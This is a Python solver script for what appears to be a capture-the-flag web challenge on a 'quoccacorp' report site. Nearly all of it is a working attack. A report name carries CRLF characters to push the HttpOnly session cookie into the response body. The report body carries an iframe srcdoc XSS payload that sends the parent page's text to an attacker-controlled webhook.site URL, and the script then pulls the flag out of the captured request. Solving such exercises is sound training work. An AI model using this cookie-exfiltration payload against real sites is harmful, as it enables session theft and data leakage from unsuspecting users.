import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite, find_flag

import base64
import json
import time
import re
import base64

BASE_URL = "https://report.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def submit_report(self, name: str, content: str) -> str:
        response = self.session.post(f"{BASE_URL}/report", data={
            "name": name,
            "content": content
        })

        session_cookie = response.cookies.get("session")
        session_cookie_payload = session_cookie.split('.')[0]

        padding = '=' * (-len(session_cookie_payload) % 4)
        decoded = base64.urlsafe_b64decode(session_cookie_payload + padding).decode()

        report_uuid = json.loads(decoded)["reports"][0]
        return report_uuid

    # Contains source code. /view endpoint found in https://report.quoccacorp.com/robots.txt
    def view_report(self, report_uuid: str):
        view_report_url = f"{BASE_URL}/view/{report_uuid}"
        return self.session.get(view_report_url)

    # Meme
    # def base64_to_image(self, image_base64_str: str = ""):
    #     from PIL import Image
    #     from io import BytesIO
    #     image_bytes = base64.b64decode(image_base64_str)
    #     image = Image.open(BytesIO(image_bytes))
    #     image.show()

    def main(self):
        # Use document.body.innerText to send HttpOnly cookies
        SRCDOC_PAYLOAD = f'''<script>fetch(`{self.webhooksite.url}?q=${{window.parent.document.body.innerText}}`);</script>'''
        PAYLOAD = f'''<iframe srcdoc="{SRCDOC_PAYLOAD}"></iframe>'''

        # Use \r\n\r\n to push the cookie into the response body
        self.submit_report("\r\n\r\n", PAYLOAD)

        time.sleep(6)

        q_value = self.webhooksite.get_requests_json()["data"][0]["query"]['q']
        flag_base64 = re.search(r'flag=([^;]+);', q_value).group(1)

        # Base64 decode the flag cookie
        find_flag(base64.b64decode(flag_base64).decode())

if __name__ == "__main__":
    Solver().main()
